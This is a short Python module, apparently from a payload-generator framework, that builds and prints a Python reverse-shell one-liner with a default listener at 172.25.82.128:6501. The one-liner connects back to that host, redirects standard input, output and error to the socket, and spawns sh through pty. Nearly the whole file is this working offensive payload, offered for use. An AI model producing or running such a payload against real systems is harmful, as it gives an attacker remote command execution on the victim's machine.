#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# Metadata for a Python-based reverse shell
metadata = {
    "name": "EnvPythonShell Reverse Shell",
    "description": "A Python-based reverse shell that utilizes environment variables for configuration and the pty module to spawn a shell.",
    "authors": ["DrDataYE"],
    "date": "2023-04-01",
    "license": "Custom Intellectual License",
    "references": [
        {"type": "url", "ref": "https://github.com/t3l3machus/hoaxshell"},
        {"type": "url", "ref": "https://revshells.com"},
    ],
    "options": {
        "lhost": {
            "type": "address",
            "description": "Target host address for the reverse shell connection",
            "required": True,
            "default": "172.25.82.128",
        },
        "lport": {
            "type": "int",
            "description": "Listening port on the target host for incoming connections",
            "required": True,
            "default": 6501,
        },
        "encode": {
            "type": "string",
            "description": "Encoding method for transmitted commands",
            "required": False,
            "default": "utf-8",
        },
    },
}


class Encoder:
    pass


def run(args):
    """Execute the Python reverse shell command based on provided arguments using environment variables"""
    lhost = args.get("lhost", metadata["options"]["lhost"]["default"])
    lport = args.get("lport", metadata["options"]["lport"]["default"])
    encode = args.get("encode", metadata["options"]["encode"]["default"])

    # Python reverse shell command using environment variables
    python_script = f"""export RHOST="{lhost}";export RPORT={lport};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'"""
    print(python_script)
